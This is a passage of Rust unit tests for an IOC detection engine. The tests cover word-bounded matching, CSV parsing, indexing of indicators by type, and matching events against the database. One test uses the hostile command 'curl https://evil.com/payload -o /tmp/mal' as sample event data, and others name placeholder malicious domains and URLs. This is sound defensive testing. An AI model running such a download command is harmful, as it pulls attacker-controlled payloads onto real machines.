    fn contains_word_bounded_helpers() {
        assert!(contains_word_bounded("connect to evil.com:443", "evil.com"));
        assert!(!contains_word_bounded("connect to notevil.com", "evil.com"));
        assert!(!contains_word_bounded(
            "connect to cdn-evil.com",
            "evil.com"
        ));
        assert!(contains_word_bounded("ip 10.0.0.1:80", "10.0.0.1"));
        assert!(!contains_word_bounded("ip 210.0.0.1:80", "10.0.0.1"));
        assert!(!contains_word_bounded("ip 10.0.0.100:80", "10.0.0.1"));
    }

    #[test]
    fn contains_word_bounded_empty_needle_is_false() {
        assert!(!contains_word_bounded("abc", ""));
        assert!(!contains_word_bounded("", ""));
    }

    #[test]
    fn contains_word_bounded_handles_non_ascii_needle_without_panicking() {
        assert!(contains_word_bounded(
            "blocked: δοκιμή.example",
            "δοκιμή.example"
        ));
        assert!(!contains_word_bounded(
            "blocked: xδοκιμή.example",
            "δοκιμή.example"
        ));
    }

    // -- CSV edge cases ----------------------------------------------------

    #[test]
    fn csv_split_handles_escaped_quotes() {
        let fields = split_csv_fields(r#""hello ""world""",value2"#);
        assert_eq!(fields.len(), 2);
        assert_eq!(fields[0], r#"hello "world""#);
        assert_eq!(fields[1], "value2");
    }

    // -- IocDatabase::add_entry and indexing --------------------------------

    #[test]
    fn add_entry_indexes_url() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "https://evil.com/payload".into(),
            ioc_type: IocType::Url,
            description: None,
            source: None,
        });
        assert_eq!(db.url_index.len(), 1);
        assert_eq!(db.hash_index.len(), 0);
        assert_eq!(db.domain_index.len(), 0);
        assert_eq!(db.ip_index.len(), 0);
    }

    #[test]
    fn add_entry_ignores_empty_indicator() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "   ".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });
        assert!(db.entries.is_empty());
        assert!(db.domain_index.is_empty());
    }

    #[test]
    fn scan_index_matches_all_four_index_types() {
        // Verify that the unified scan_index helper produces results for all
        // four index types (hash, domain, IP, URL) just as the old inlined
        // loops did.
        let sha = "b".repeat(64);
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: sha.clone(),
            ioc_type: IocType::Sha256,
            description: None,
            source: None,
        });
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });
        db.add_entry(IocEntry {
            indicator: "10.0.0.99".into(),
            ioc_type: IocType::IPv4,
            description: None,
            source: None,
        });
        db.add_entry(IocEntry {
            indicator: "https://malware.example.org/dl".into(),
            ioc_type: IocType::Url,
            description: None,
            source: None,
        });

        // Build an event whose summary contains all four indicators
        let summary = format!(
            "hash={} dns=evil.com ip=10.0.0.99 url=https://malware.example.org/dl",
            sha
        );
        let event = make_event(&summary, None, None);

        let results = match_event(&db, &event);
        assert_eq!(
            results.len(),
            4,
            "should match all four IOC types; got {}",
            results.len()
        );
    }

    #[test]
    fn match_event_finds_url_in_summary() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "https://evil.com/payload".into(),
            ioc_type: IocType::Url,
            description: None,
            source: None,
        });

        let event = make_event(
            "curl https://evil.com/payload -o /tmp/mal",
            Some("curl"),
            None,
        );

        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].match_field, "summary");
    }
}
